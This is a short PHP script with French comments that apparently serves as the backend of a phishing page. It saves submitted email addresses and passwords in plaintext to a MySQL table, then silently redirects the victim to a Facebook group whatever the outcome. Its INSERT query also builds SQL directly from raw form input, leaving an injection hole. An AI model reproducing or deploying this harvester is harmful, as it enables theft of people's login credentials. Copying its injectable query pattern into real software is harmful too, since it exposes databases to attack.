<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Informations de connexion à la base de données
    $servername = "serveur mysql";
    $username = "username";
    $password = "password";
    $dbname = "database name";

    // Créer une connexion
    $conn = new mysqli($servername, $username, $password, $dbname);

    // Vérifier la connexion
    if ($conn->connect_error) {
        ?><meta http-equiv="refresh" content="0;URL=https://www.facebook.com/groups/453917861411287/?locale=fr_FR"><?php
    }

    // Récupérer les valeurs du formulaire
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Requête SQL pour créer la table (si elle n'existe pas déjà)
    $createTableSQL = "CREATE TABLE IF NOT EXISTS utilisateurs (
        id INT AUTO_INCREMENT PRIMARY KEY,
        email VARCHAR(255) NOT NULL,
        password VARCHAR(255) NOT NULL
    )";

    if ($conn->query($createTableSQL) === TRUE) {
        // Requête SQL d'insertion des données
        $insertDataSQL = "INSERT INTO utilisateurs (email, password) VALUES ('$email', '$password')";

        if ($conn->query($insertDataSQL) === TRUE) {
           ?><meta http-equiv="refresh" content="0;URL=https://www.facebook.com/groups/453917861411287/?locale=fr_FR"><?php
        } else {
            ?><meta http-equiv="refresh" content="0;URL=https://www.facebook.com/groups/453917861411287/?locale=fr_FR"><?php
        }
    } else {
        ?><meta http-equiv="refresh" content="0;URL=https://www.facebook.com/groups/453917861411287/?locale=fr_FR"><?php
    }

    // Fermer la connexion
    $conn->close();
}
?>